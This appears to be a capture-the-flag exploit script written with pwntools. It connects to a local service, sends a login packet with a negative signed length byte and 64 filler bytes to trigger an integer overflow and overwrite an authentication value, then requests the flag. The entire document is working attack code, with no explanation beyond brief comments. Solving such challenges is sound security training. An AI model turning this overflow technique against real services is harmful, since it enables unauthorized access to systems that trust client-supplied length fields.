from pwn import remote, sleep, p8, p32


def recv_packet(r):
    l = r.recv(2)
    length = int.from_bytes(l, byteorder="big")

    res = b""
    while len(res) < length:
        res += r.recv(1)
    return res


def send_packet(r, packet):
    r.sendline(packet)

    sleep(0.1)
    data = recv_packet(r)
    print()
    print("--- RECEIVED ---")
    print(data.decode(), end='')
    print("----------------")
    print()


HOST = "127.0.0.1"  # your host
PORT = 4000         # your port
r = remote(HOST, PORT)

# Test int overflow
payload = b"\x01"  # Type Login
# Any negative value would do
payload += p8(-128, endianness="big", sign="signed")
# 1 is coded in little-endian
payload += 64 * b"A" + p32(1, endianness="little")
print(f"[+] Payload sent: {payload}")
send_packet(r, payload)

# Receive flag
print("[+] Receive flag")
send_packet(r, b"\x03\x00")

# Logout packet (not necessary)
print("[+] Logout")
send_packet(r, b"\x02\x00")

# Stop communication
print("[+] Send exit packet")
end_packet = b"\x04\x00"
send_packet(r, end_packet)
